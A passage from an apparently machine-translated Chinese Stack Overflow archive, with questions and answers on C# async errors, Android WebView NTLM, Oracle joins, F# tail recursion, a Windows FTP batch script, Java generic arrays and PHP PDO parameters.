        AsyncErrorDelegate bkWorker = SendErrorMail;
        AsyncCallback completedCallback = MyTaskCompletedCallback;
        lock (IsAsyncOpOccuring)
        {
            if (IsBusy)
            {
                //Do we need to do something if repeated async getting call in case of error occuring at same time by different users.

            }

            AsyncOperation async = AsyncOperationManager.CreateOperation(null);
            bkWorker.BeginInvoke(context,completedCallback, async);
            IsBusy = true;
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:14:00.510

> 空指针异常报告在`var async = (AsyncOperation)res.AsyncState;`

我们可以从逻辑上推断出事实并非如此。

如果之前的行有效，我们知道它`res`不为空。`AsyncState`is `object`，因此这里不涉及自定义运算符，这意味着强制转换是一种类型检查 - 它可以返回`null`（没有错误），也可以引发无效强制转换异常。

如果您看到 a `NullReferenceException`，则留下 2 个选项：

*   `res`是 null 并且是*上面的行*出错（这：我们实际上不应该期望 - 这不会发生）
*   错误实际上来自，*之后*`EndInvoke`的行

 *（当涉及到异常时，确切的行经常会有点混乱）。

我建议您在每个之间添加日志记录，以跟踪正在发生的事情。我还建议您明确地`try`围绕`EndInvoke`，因为这可能会引发异常（它会重新引发异步操作中的任何异常）。

在更一般的情况下，第三种选择是：

*   `AsyncOperation`是一个`struct`，并且`AsyncState`是`null`

但是，在这种情况下，我们可以通过演绎排除这种情况，因为如果`AsyncOperation`是 a `struct`，则以下内容**永远不会**框到`null`（只有空的`AsyncOperation?`框会框到`null`）：

```
AsyncOperation async = AsyncOperationManager.CreateOperation(null);
bkWorker.BeginInvoke(context,completedCallback, async); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:00:38.910

应该

`var async = (AsyncOperation)asyncResult.AsyncState;`

不是

`var async = (AsyncOperation)res.AsyncState;`

?*

# android - Android WebView - NTLM 身份验证

> ID：13491759
> 
> 赞同：3
> 
> 时间：2012-11-21T10:57:32.900
> 
> 标签：android, webview, android-webview

我的应用程序中嵌入了一个 WebView。我正在尝试查看使用 NTLM 身份验证的网页。如何使用 WebView 执行 NTLM 身份验证并查看此页面？

我成功地能够使用 DefaultHttpClient 和 JCIFS 库对此页面进行身份验证。但是我怎样才能为 WebView 做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-09-28T09:33:30.167

我问这个问题已经两年了。与此同时，我想出了这个问题的答案——

WebView 支持开箱即用的 NTLM 身份验证。`onReceivedHttpAuthRequest`回调中`WebViewClient`有一个方法参数，一个名为 的方法参数`handler`。这是类型`HttpAuthHandler`。`handler.proceed(username, password)`将使用 NTLM 协议自动对 Web 服务器进行身份验证。此处理程序抽象使用的身份验证协议。基本身份验证和 NTLM 身份验证都使用同一行代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-24T00:05:06.470

我也有同样的问题！还有另一种间接方式。你得到`HttpResponse`然后将 html 文件保存到内部存储中，然后将文件加载到`WebView`. 不过，我以前从未尝试过。

# wordpress - Wordpress 主网站和移动网站重复内容。

> ID：13491761
> 
> 赞同：0
> 
> 时间：2012-11-21T10:57:40.263
> 
> 标签：wordpress, seo, duplicate-data, mobile-website

基本上，客户也要求将他的`WordPress`网站变成移动网站。我从未尝试过，对此一无所知`SEO`。

然而，问题出现了，这可能会导致重复的内容问题`Google`，因此这两个网站都可能在排名中下降。

我正在考虑通过一个可用的 WordPress 移动网站插件将网站变成移动网站。

我的问题是重复内容是否会成为问题？有没有人试过这个？

在做了一些阅读之后，我认为可以告诉`Google`不要索引移动网站，尽管据我了解这将是同一组文件。所以我不确定如果我告诉它不要索引其中一个，它也会删除另一个。

任何有 WordPress 和`SEO`知识的人都可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T14:56:09.657

在我看来，如果您有两个具有相同文本的**索引**URL，则存在重复的内容。对于谷歌来说，重复的内容一直是​​个问题。

如果您决定不为网站的移动版本编制索引，则不会有重复的内容，因为只有一个版本的网站会被 Google 编制索引。

重复内容与您的 CMS (Wordpress) 无关，它只是一个关于两个具有相同文本的**索引页面的故事。**

# sql - 在内部联接查询中需要帮助

> ID：13491765
> 
> 赞同：1
> 
> 时间：2012-11-21T10:57:59.933
> 
> 标签：sql, oracle, inner-join

```
SELECT table1.*,table2.*, table3.*
FROM table1, table2, table3
inner join 
 (
   select table1.id AS pid, max(table1.createtime) AS timestamp
   from table1 group by table1.id
 ) A on A.pid = table1.id AND A.timestamp = table1.createtime
WHERE table3.id = table1.id
ORDER BY table1.createtime; 
```

我正在尝试仅获取 table1 中每个 id 的最后修改记录。

对于上述查询，我​​收到以下错误：

```
"%s:invalid identifier" for  "A.timestamp = table1.IDA2A2" this part. 
```

请让我知道这个查询有什么问题。数据库是甲骨文。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:03:17.760

您的问题的一部分是您正在混合`JOIN`语法 - 您的查询同时使用逗号连接和 ANSI JOIN 语法。您需要正确加入表格：

```
SELECT t1.,t2., t3.* 
FROM table1 t1
INNER JOIN table2 t2
  on t1.id = t2.id
INNER JOIN table3 t3
  on t1.id = t3.id
inner join 
(
  select table1.id AS pid, max(table1.createtime) AS timestamp 
  from table1 
  group by table1.id
) A 
  on A.pid = t1.id 
  AND A.timestamp = t1.createtime 
ORDER BY t1.createtime; 
```

# .net - F# 中的尾递归和异常

> ID：13491768
> 
> 赞同：8
> 
> 时间：2012-11-21T10:58:06.273
> 
> 标签：.net, f#, tail-recursion

我已经用谷歌搜索了很长时间，但仍然找不到答案。据我了解，如果调用者将调用包装在 try/catch 和/或 try/finally 块中，则在 .NET 4.5 上运行的 F# 3.0 不会将尾递归用于递归方法。如果有一个 try/catch 或 try/finally 在堆栈上几级，情况会怎样？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-21T11:24:13.443

如果将某些（尾）递归函数的主体包装在`try`...`with`块中，则该函数不再是尾递归，因为在递归调用期间不能丢弃调用帧 - 它需要保留在堆栈中并注册异常处理程序。

例如，假设您有类似`iter`功能的东西`List`：

```
let rec iter f list =
  try
    match list with
    | [] -> ()
    | x::xs -> f x; iter f xs
  with e ->
    printfn "Failed: %s" e.Message 
```

当您调用`iter f [1;2;3]`时，它将创建 4 个带有异常处理程序的嵌套堆栈帧（如果您添加`rethrow`到`with`分支中，那么它实际上会打印 4 次错误消息）。

在不破坏尾递归的情况下，您无法真正添加异常处理程序。但是，您通常不需要嵌套异常处理程序。所以最好的解决方案是重写函数，使其不需要在每次递归调用中处理异常：

```
let iter f list =
  let rec loop list =
    match list with
    | [] -> ()
    | x::xs -> f x; loop xs
  try loop list
  with e -> printfn "Failed: %s" e.Message 
```

这有一点不同的含义——但它不会创建嵌套的异常处理程序，并且`loop`仍然可以是完全尾递归的。

另一种选择是仅在主体上添加异常处理，*不包括*尾递归调用。实际上，在此示例中唯一可以引发异常的是对`f`;的调用。

```
let rec iter f list =
  match list with
  | [] -> ()
  | x::xs -> 
    try
      f x
    with e ->
      printfn "Failed: %s" e.Message
    iter f xs 
```

# c - 列表中的内存泄漏 tokyocabinet

> ID：13491769
> 
> 赞同：2
> 
> 时间：2012-11-21T10:58:12.880
> 
> 标签：c, memory-leaks, tokyo-cabinet

使用后是否要使用该功能`free()`：

```
TCLIST *list = tcbdbrange(); 
```

或使用足够的：

```
tclistdel(list); 
```

我要`free(p)`for:`p = (lk_key*) tclistval(list,...)`还是`tclistdel(list)`删除 list 的所有元素？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:40:02.830

您没有阅读任何[文档](http://linux.die.net/man/3/tcbdb)吗？这些是文档应该回答的典型问题。事实上，它们是：

> 因为返回值的对象是用函数''创建的，所以在不再使用时`tclistnew`应该用函数''删除。`tclistdel`

我解释这意味着您不必遍历列表并单独删除每个元素。

# windows - FTP 命令一直在命令提示符下运行。它使用 dat 文件作为输入

> ID：13491771
> 
> 赞同：1
> 
> 时间：2012-11-21T10:58:13.537
> 
> 标签：windows, batch-file, ftp

BAT文件代码如下：

```
set SCRIPT_NAME=FTP_SCRIPT.DAT
@echo open "Server"> %SCRIPT_NAME%
@echo "User">> %SCRIPT_NAME%
@echo "Password">> %SCRIPT_NAME%
@echo bin>> %SCRIPT_NAME%
@echo hash>> %SCRIPT_NAME%

@echo mput export.csv>> %SCRIPT_NAME%
@echo y>> %SCRIPT_NAME%
@echo quit>> %SCRIPT_NAME%

@ftp -n -s:%SCRIPT_NAME% 
```

它正确创建`FTP_SCRIPT.DAT`文件，但是命令提示符保持空白并且`FTP`根本不会出现。我第一次使用批处理脚本。所以不太了解它的细节。这个`FTP`命令将如何工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T21:56:04.370

我在您的脚本中没有看到任何错误，但请确保您在打开命令中输入正确的 ftp 方向：“xxx.xxxx.xxxx.xxxx.:PortNum”

尝试这个：

```
SET "SCRIPT_NAME=FTP_SCRIPT.DAT"

(

 ECHO open "Server:Port"
 ECHO "User"
 ECHO "Password"
 ECHO bin
 ECHO hash
 ECHO mput "export.csv"
 ECHO y
 ECHO close

)>"%SCRIPT_NAME%"

%WINDIR%\system32\FTP.exe -n -s:"%SCRIPT_NAME%" 
```

# button - Facebook 喜欢按钮在 Facebook 个人资料墙上显示错误的标题

> ID：13491782
> 
> 赞同：1
> 
> 时间：2012-11-21T10:59:17.980
> 
> 标签：button, facebook-like, facebook-opengraph, facebook-apps

我们在 wordpress 中建立了一个网站，并使用 AddThis 插件实现了社交分享图标（Twitter/FB like/G+/...）。

当我在 FB 上点赞一篇文章时，该文章会显示在我的 FB 个人资料墙中，但标题错误（例如，不是`example.com`在我的墙上显示，而是在显示`example sample blog`）

我检查了元标记`fb:app_id`和 id 是正确的。

我已经使用调试工具检查元标记是否被 FB 正确读取并且是正确的。 [http://developers.facebook.com/tools/debug](http://developers.facebook.com/tools/debug)

在 FB 论坛或谷歌中找不到任何帮助。

感谢紧急帮助。

提前致谢。

# java - 创建泛型类型的数组

> ID：13491784
> 
> 赞同：2
> 
> 时间：2012-11-21T10:59:35.903
> 
> 标签：java, generics, wildcard

假设我想通过默认构造函数创建一个长度为 5 的数组

```
public class A <E extends Comparable<? super E>> implements B<E>
{
     private E[] myArray;

     public A()
     {
         myArray = (E[]) new Object[5]; 
     }    

} 
```

这是正确的做法吗？我很困惑我是否必须在 [] 之前声明“可比”。所以

```
 private  Comparable[] myArray; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T11:21:58.293

没有。它会`ClassCastException`在运行时抛出

让我们看看原因。因为`<E extends Comparable<? super E>>`，一旦编译器删除了所有泛型类型，`E`就会被`Comparable`整个类所取代。

因此，在您的构造函数中，这主要发生在运行时：

```
 myArray =  new Comparable[5]; 
```

这是错误的，因此是例外。

它本来可以与`class A <E> implements B<E>`

所以解决方案是：

```
class A <E extends Comparable<? super E>> implements B<E>{
  Comparable[] array;
  public A(){
    array =  new Comparable[5];
   }
    @SuppressWarnings("unchecked")
   E get(int x)
   {
     return (E) array[x];
   }
   void add(E b){
     //for now
     array[0] = b;
   } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T20:46:42.283

您发布的代码的问题是 is 的擦除`E[]`（`Comparable[]`因为`E`的上限是`Comparable`），因此强制转换其真实类型为`Object[]`to的对象`Comparable[]`将失败。

您可以简单地将其更改为以下内容，并且不会引发异常：

```
public class A <E extends Comparable<? super E>> implements B<E>
{
     private E[] myArray;

     public A()
     {
         myArray = (E[]) new Comparable[5]; 
     }    

} 
```

然而，这里还有更微妙的地方：`myArray`is not really type `E[]`。在课堂内，`E[]`被擦除为`Comparable[]`，所以没关系。但是你必须确保永远不要暴露`myArray`在课堂之外。由于它是私有的，您只需要确保没有方法返回它或其他东西。

这样做的好处是保持`myArray`type `E[]`，而不是 Jatin 对 using 的回答`Comparable[]`，你不必每次从中得到一些东西时都进行强制转换，因此代码更好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T11:12:32.837

正如@Jatin 所指出的，如果你`Object`转换为，你会得到一个运行时异常，`Comparable`因为它是一个超级 for `Comparable`，因此不能转换为子类型。

如果可能，我建议您使用 an`ArrayList`代替：

例如

```
public class A <E extends Comparable<? super E>> implements B<E> {
    private List<E> myArray;

     public A() {
         myArray = new ArrayList<E>(); 
     }    
} 
```

# android - 方向更改后留在当前选项卡上Actionbar Android

> ID：13491787
> 
> 赞同：5
> 
> 时间：2012-11-21T10:59:41.457
> 
> 标签：android, android-actionbar

在我的应用程序中，当方向更改时，操作栏中的选定选项卡设置为第一个选项卡，我希望它保持在选定选项卡上，而不是跳转到第一个选项卡...

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-04-26T11:22:50.657

实际上，您可以使用 onSavedInstanceState 非常轻松地做到这一点：

```
@Override
protected void onSaveInstanceState(Bundle outState) {
    super.onSaveInstanceState(outState);
    int i = getActionBar().getSelectedNavigationIndex();
    outState.putInt("index", i);
} 
```

然后将其包含在您的 onCreate() 方法中：

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
            ...
    if(savedInstanceState != null) {
        int index = savedInstanceState.getInt("index");
        getActionBar().setSelectedNavigationItem(index);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-18T14:13:32.873

对于带有工具栏的 21+，这对我有用：

```
import android.support.v4.app.FragmentManager;
import android.support.v4.view.ViewPager;
import android.support.v7.app.ActionBar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;

public class MainActivity extends AppCompatActivity {

   private ViewPager viewPager;
   private static final String FLAG_CURRENTLY_SELECTED_TAB_INDEX = "currentlySelectedTabIndex";

   @Override
   protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.mylayout);

        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        ActionBar actionBar = getSupportActionBar();
        if (actionBar != null) {
            actionBar.setHomeAsUpIndicator(R.mipmap.ic_launcher);
            actionBar.setDisplayHomeAsUpEnabled(true);
        }

        viewPager = (ViewPager) findViewById(R.id.viewpager);
        FragmentManager fragmentManager = getSupportFragmentManager(); 
        viewPager.setAdapter(getMyCustomAdapter());            

        TabLayout tabLayout = (TabLayout) findViewById(R.id.tabs);
        tabLayout.setupWithViewPager(viewPager);     

        if (savedInstanceState != null) {
            final int currentlySelectedTabIndex = savedInstanceState.getInt(FLAG_CURRENTLY_SELECTED_TAB_INDEX, -1);
            if (currentlySelectedTabIndex > -1) {
                viewPager.setCurrentItem(currentlySelectedTabIndex);
            }
        }

    }

 @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState); 

        if (viewPager != null) {
            int i = viewPager.getCurrentItem();
            outState.putInt(FLAG_CURRENTLY_SELECTED_TAB_INDEX, i);
        }
    } 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-28T19:35:59.870

由于`getLastNonConfigurationInstance()`已被弃用，因此在您的 FragmentActivity 中只需覆盖 onRetainCustomNonConfigurationInstance() 并使用新的`getLastCustomNonConfigurationInstance()`：

```
@Override
public Object onRetainCustomNonConfigurationInstance() {
    return mViewPager.getCurrentItem();
} 
```

并像这样检索它`onCreate()`：

```
Integer lastTab = (Integer) getLastCustomNonConfigurationInstance();
if (lastTab != null) {
    mViewPager.setCurrentItem(lastTab);
} 
```

# android - Android背景ListView滚动时变黑

> ID：13491788
> 
> 赞同：3
> 
> 时间：2012-11-21T10:59:44.003
> 
> 标签：android, android-layout

我创建了一个特定的 Listview，它存在于以下元素中，以创建一个可滚动列表，其中每一行包含左侧的图像和右侧的一些文本。我用于列表视图的 xml 如下所示：

```
<LinearLayout
xmlns:android="http://schemas.android.com/apk/res/android"
android:orientation="vertical"
android:layout_width="fill_parent" 
android:layout_height="fill_parent"
android:background="#C8C8C8"
>
<TextView
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"/>
<ListView
    android:id="@android:id/list"
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent"
    android:drawSelectorOnTop="false"
    android:divider="#C8C8C8"
    android:background="#C8C8C8"/> 
```

对于listview的行，我使用的xml代码如下：

```
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal"
    android:background="@drawable/bg_row"
>
    <ImageView
        android:layout_width="wrap_content"
        android:paddingLeft="10px"
        android:paddingRight="15px"
        android:paddingTop="5px"
        android:paddingBottom="5px"
        android:layout_height="wrap_content"
        android:src="@drawable/bg_image"
    />
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:paddingTop="5px"
        android:paddingBottom="5px"
        android:textSize="16sp"
        android:textColor="#000000"
        android:layout_gravity="center"
        android:maxHeight="50px"/>
</LinearLayout> 
```

只要屏幕静态显示（如没有移动），它就会正确显示，但是当我开始滚动列表时，行项目的背景（代码中显示的“图标”）将是正确显示，但“根”布局的背景将变为完全黑色......当滚动停止时，大多数情况下，背景会恢复它的颜色......当我测试时，我还在那个根中添加了一个 TextView -具有相同背景的元素，当列表滚动时，这个元素会保留它的颜色......知道为什么会发生这种情况，以及如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T11:07:00.087

您需要将 ListView 的缓存颜色设置为与 ListView 的颜色相同：

```
<ListView
    android:id="@android:id/list"
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent"
    android:drawSelectorOnTop="false"
    android:divider="#C8C8C8"
    android:background="#C8C8C8"
    android:cacheColorHint="#C8C8C8"  /> 
```

旁注：如果你想让你的分隔线不可见，你也可以这样做：

```
android:divider="@null" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T11:03:46.217

在 ListView 标签上添加一个属性

```
android:cacheColorHint="#00000000" // setting as a transparent color 
```

# jekyll - GitHub Pages：子文件夹中的 Octopress（根目录中的其他页面）

> ID：13491790
> 
> 赞同：4
> 
> 时间：2012-11-21T10:59:52.050
> 
> 标签：jekyll, octopress, github-pages

我正在将我的博客从自托管的[Wordpress](http://wordpress.org)转移到（[由 GitHub-pages 提供支持的](http://octopress.org/docs/deploying/github/)）[Octopress](http://octopress.org)。

到目前为止，我已经成功设置并复制了我的博客到`myusername.github.com`，其中包含`CNAME` `http://mydomain.com`. （所以，浏览`http://mydomain.com`显示我的 Octopress 博客。花花公子。）

我想修改我的设置，以便如下所示：

*   `http://mydomain.com`→ 简单的html登陆页面
*   `http://mydomain.com/blog`→ Octopress 博客，尽显荣耀
*   `http://mydomain.com/sdf`→ 我想托管的其他简单的 html 网站
*   `http://mydomain.com/sdfsdfdsf`-> 如上
*   ...（任意数量的其他根级站点）

但是……我希望我的登录页面（和其他杂项网站）托管在 GitHub-pages 存储库中，并将源存储在 Octopress 旁边。

理想情况下，`«octopress»/source/`应该是这样的：

*   `«octopress»/source/index.html`→ 我的登陆页面
*   `«octopress»/source/blog/*`→ 普通 Octopress 源文件夹（包含`_posts`、`assets`、`_layouts`等）
*   `«octopress»/source/sdf/index.html`→ 其他杂项网站

到目前为止，我已经找到了有关[如何将 Octopress 部署到子目录的](http://octopress.org/docs/deploying/subdir/)说明。但据我所知，这些说明不允许您在`«octopress»/source/`.

我会喜欢关于如何完成我所追求的建议。我觉得这并不难（也许只是在某处调整一些 Jekyll 文件）。

非常感谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-07-10T05:39:47.463

您可以将您的博客索引页面更改为`blog/index.html`喜欢[文档描述的内容](http://octopress.org/docs/theme/template/#landing_page)。然后，将您的登录页面和其他网站放入`/source`目录中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T11:53:07.140

如果您在本地运行 Jekyll 而不是使用 github 服务器上的版本，则无需在 Jekyll 中执行所有操作 - 只需使用 shell 脚本在生成和部署步骤之间移动一些文件夹。

Jekyll 运行后，一切都是静态文件，部署步骤只是提交并推送此时发生在输出文件夹中的任何内容。

# xml - 循环内具有多个相似标签的 Talend XML 元数据

> ID：13491800
> 
> 赞同：0
> 
> 时间：2012-11-21T11:00:26.790
> 
> 标签：xml, talend

我想知道用这种格式创建 XML 文件元数据的最佳方法是什么：

```
<?xml version="1.0" encoding="utf-8"?>
<django-objects version="1.0">
    <object pk="8" model="auth.user">
        <field type="CharField" name="username">jd</field>
        <field type="CharField" name="first_name">John</field>
        <field type="CharField" name="last_name">Doe</field>
        <field type="CharField" name="email">bla@bla.com</field>
    </object>
    <object pk="2102684" model="auth.user">
        <field type="CharField" name="username">kr</field>
        <field type="CharField" name="first_name">Karl</field>
        <field type="CharField" name="last_name">Row</field>
        <field type="CharField" name="email">karl@test.com</field>
    </object>
  .... etc
</django-objects> 
```

这里的问题是标签重复多次（而不是有一个单独的`<username>, <first_name>`，等等标签），这导致默认的元数据映射只返回第一次出现（用户名）。

我怎样才能最好地映射这种数据？

谢谢科恩

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T16:40:58.060

好的，我猜这是一个新问题：我想通了。我只需要使用 XPATH 将字段映射到新列。例如：

```
 <field type="CharField" name="username">jd</field> 
```

使用 tFileInputMSXML 组件进行这样的映射：

```
 "field[@name='username']". 
```

每个`field`标签都是这样映射的。奇迹般有效。

# java - 从非 Controller 类中的 application.properties 访问属性

> ID：13491801
> 
> 赞同：0
> 
> 时间：2012-11-21T11:00:29.227
> 
> 标签：java, spring, properties, autowired

[http://www.javadb.com/using-a-message-handler-to-alter-the-soap-header-in-a-web-service-client](http://www.javadb.com/using-a-message-handler-to-alter-the-soap-header-in-a-web-service-client)

在上面提到的示例中，我们在消息处理程序类中硬编码了 TestUser(username) 和 TestPassword(password)。我想将这些值外部化。经过一些研究，我无法实现 @Autowired 和 @value 。请帮我解决这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:16:30.257

如果您的`.properties`文件保存在本地硬盘驱动器的某个位置并且它是 KPL（关键项目位置）之一，您可以简单地执行以下操作：

```
Properties propObj = new Properties ();
FileInputStream fis = new FileInputStream("relative path to your file");
propObj.load(fis); 
```

完成此操作后，只需使用 getProperty() 或 setProperty() 即可访问/更改所需的属性。`loadFromXML()`如果您选择的文件是文件，还有另一种使用该方法的方法`xml`。我希望这可以解决您的问题，因为听起来您只是在加载文件时遇到了麻烦，而不管是否在控制器类中。如果我是对的，那么你会在网上找到无数的例子，告诉你只做我上面写的:)

使用 @Autowire 之类的东西时，请记住您必须在目标类开始之前使用`@ContextConfiguration("location_of_file.xml")`. 指定 applicationContext 文件时，获取正确的相对路径可能有点棘手。请参阅[此处](http://static.springsource.org/spring/docs/3.0.x/api/org/springframework/test/context/ContextConfiguration.html)并点击其他链接以了解有关此内容的更多信息。

**顺便说一句，您必须记住应用程序属性在某种程度上是应用程序内部的，因此，它们被设置在`.properties`源文件之外的文件中，以便它可以在不更改源代码的情况下运行（如果我在说胡话，请纠正我！）。** 如果您使用的是 Maven 或 Ivy 等构建自动化工具，有一种方法可以确保使用 a) POM 和 b) applicationContext.xml 文件设置您的应用程序属性。通过这种方式，如果相对路径无法成为目标计算机上的某个路径，应用程序甚至可以更轻松地与崩溃解耦。如果你想要这个，你必须小心在 POM 中设置过滤器。我没有亲自手动完成此操作，但几个月前我们正在开展一个项目，当时我的一位同事将文件管理器放在我面前。我记得这一点，因为由于过滤器设置不正确，一切都失败了。抱歉，您必须使用 Google 叔叔自己找出答案！

# pdo - PDO：将额外的参数传递给准备好的语句而不是需要

> ID：13491802
> 
> 赞同：7
> 
> 时间：2012-11-21T11:00:30.443
> 
> 标签：pdo, prepared-statement

**您能否向使用 PDO 的预准备语句发送比需要更多的参数而没有不良副作用？**

这似乎是一个奇怪的问题，但我问是因为我连续有 4 个查询，它们都使用相似和不同的参数。查询的相关部分：

第一个（选择，与其他人不同的表）：
`WHERE threadID = :tid`

第二（选择）：
`WHERE user_ID = :u_ID AND thread_ID = :tid`

第 3 次（如果第 2 次成功则更新）：
`SET time = :current_time WHERE user_ID = :u_ID AND thread_ID = :tid`

第 4 次（如果第 2 次失败则插入）：
`VALUES (:u_ID, :tid, :current_time)`

我可以在开头声明一个包含三个参数的数组并将其用于所有 4 个查询吗？

为了解决任何混淆，查询将单独执行。它是参数变量被重用，因此这意味着某些查询将接收他们不需要的参数。所以像：

```
$parameters = array(':tid' => $tid, ':u_ID' => $u_ID, ':current_time' => $time);

$1st = $db->prepare($query1);
$1st->execute($parameters);

$2nd = $db->prepare($query2);
$2nd->execute($parameters);

$3rd = $db->prepare($query3);
$3rd->execute($parameters);

$4th = $db->prepare($query4);
$4th->execute($parameters); 
```

如果可以，我应该吗？这会减慢或导致我的数据库或脚本出现安全漏洞吗？

如果我能让这个问题更清楚一点，请提问。

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2016-08-19T19:46:13.657

[自从第一次提出这个问题以来，文档](http://php.net/manual/en/pdostatement.execute.php)可能已经更新，但现在已经很清楚地表明“**否**”

> 您不能绑定比指定更多的值；如果 input_parameters 中存在的键多于 PDO::prepare() 中指定的 SQL，则语句将失败并发出错误。

这些[答案](https://stackoverflow.com/q/4260086/4233593)应该有助于过滤掉额外的参数。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-18T16:04:20.110

我知道这已经得到解答，它只是询问您*是否*可以发送额外的参数，但我认为人们可能会遇到这个问题，并想知道如何绕过这个限制。这是我使用的解决方案：

```
$parameters = array('tid' => $tid, 'u_ID' => $u_ID, 'current_time' => $time);

$1st = $db->prepare($query1);
$1st->execute(array_intersect_key($parameters, array_flip(array('tid'))));

$2nd = $db->prepare($query2);
$2nd->execute(array_intersect_key($parameters, array_flip(array('u_ID', 'tid'))));

$3rd = $db->prepare($query3);
$3rd->execute(array_intersect_key($parameters, array_flip(array('u_ID', 'tid', 'current_time'))));

$4th = $db->prepare($query4);
$4th->execute(array_intersect_key($parameters, array_flip(array('u_ID', 'tid', 'current_time')))); 
```

可以将 array_interset_key 和 array_flip 操作提取到它自己的函数中，例如：

```
function filter_fields($params,$field_names) {
    return array_intersect_key($params, array_flip($field_names))
} 
```

我只是还没来得及。

该函数翻转您的键名数组，因此您有一个没有值但有正确键的数组。然后 intersect 过滤第一个数组，这样您就只有两个数组中的键（在这种情况下，只有 array_flipped 数组中的键）。但是你得到了原始数组的值（不是空的）。因此，您制作一组参数，但指定实际发送到 PDO 的参数。

因此，使用该功能，您可以：

```
$parameters = array('tid' => $tid, 'u_ID' => $u_ID, 'current_time' => $time);

$1st = $db->prepare($query1);
$1st->execute(filter_fields($parameters, array('tid')));

$2nd = $db->prepare($query2);
$2nd->execute(filter_fields($parameters, array('u_ID', 'tid')));

$3rd = $db->prepare($query3);
$3rd->execute(filter_fields($parameters, array('u_ID', 'tid', 'current_time')));

$4th = $db->prepare($query4);
$4th->execute(filter_fields($parameters, array('u_ID', 'tid', 'current_time'))); 
```

如果你有 PHP 5.4，你可以使用方括号数组语法，让它更酷：

```
$parameters = array('tid' => $tid, 'u_ID' => $u_ID, 'current_time' => $time);

$1st = $db->prepare($query1);
$1st->execute(filter_fields($parameters, ['tid']));

$2nd = $db->prepare($query2);
$2nd->execute(filter_fields($parameters, ['u_ID', 'tid']));

$3rd = $db->prepare($query3);
$3rd->execute(filter_fields($parameters, ['u_ID', 'tid', 'current_time']));

$4th = $db->prepare($query4);
$4th->execute(filter_fields($parameters, ['u_ID', 'tid', 'current_time'])); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-21T19:35:24.313

我有机会测试我的问题，答案是**你不能发送比查询使用更多的参数**。您收到以下错误：

```
PDOException Object
(
    [message:protected] => SQLSTATE[HY093]: Invalid parameter number: parameter was not defined
    [string:Exception:private] => 
    [code:protected] => HY093
    [file:protected] => C:\Destination\to\file.php
    [line:protected] => line number
    [trace:Exception:private] => Array
        (
            [0] => Array
                (
                    [file] => C:\Destination\to\file.php
                    [line] => line number
                    [function] => execute
                    [class] => PDOStatement
                    [type] => ->
                    [args] => Array
                        (
                            [0] => Array
                                (
                                    [:u_ID] => 1
                                    [:tid] => 1
                                    [:current_time] => 1353524522
                                )

                        )

                )

            [1] => Array
                (
                    [file] => C:\Destination\to\file.php
                    [line] => line number
                    [function] => function name
                    [class] => class name
                    [type] => ->
                    [args] => Array
                        (
                            [0] => SELECT
                                                column
                                            FROM
                                                table
                                            WHERE
                                                user_ID  = :u_ID AND
                                                thread_ID = :tid
                            [1] => Array
                                (
                                    [:u_ID] => 1
                                    [:tid] => 1
                                    [:current_time] => 1353524522
                                )

                        )

                )

        )

    [previous:Exception:private] => 
    [errorInfo] => Array
        (
            [0] => HY093
            [1] => 0
        )

) 
```

我对 PDO 知之甚少，因此我的问题是，但我认为因为 :current_time 已发送但未使用，并且错误消息是“无效参数编号：未定义参数”，所以您无法发送未定义的额外参数用过的。

此外，还会生成错误代码 HY093。现在我似乎在任何地方都找不到任何解释 PDO 代码的文档，但是我遇到了以下两个专门关于 HY093 的链接：
[什么是 PDO 错误 HY093](http://blog.cnizz.com/2010/08/11/what-is-pdo-error-hy093-debugfix-mysql-php-pdo-error-hy093/)
[SQLSTATE[HY093]](https://stackoverflow.com/questions/9234425/sqlstatehy093-pdo-statement-during-insert-into-mysql-db)

当您错误地绑定参数时，似乎会生成 HY093。这一定发生在这里，因为我绑定了太多参数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T11:14:43.083

一次执行不同类型的多个查询会导致问题。您可以通过一次执行运行多个选择或多个更新。对于这种情况，创建不同的准备好的语句对象并相应地传递参数。

```
// for WHERE threadID = :tid
$st1 = $db->prepare($sql);
$st1->bindParam(':tid', $tid);
$st1->execute();
or
$st1->execute(array(':tid'=>$tid);

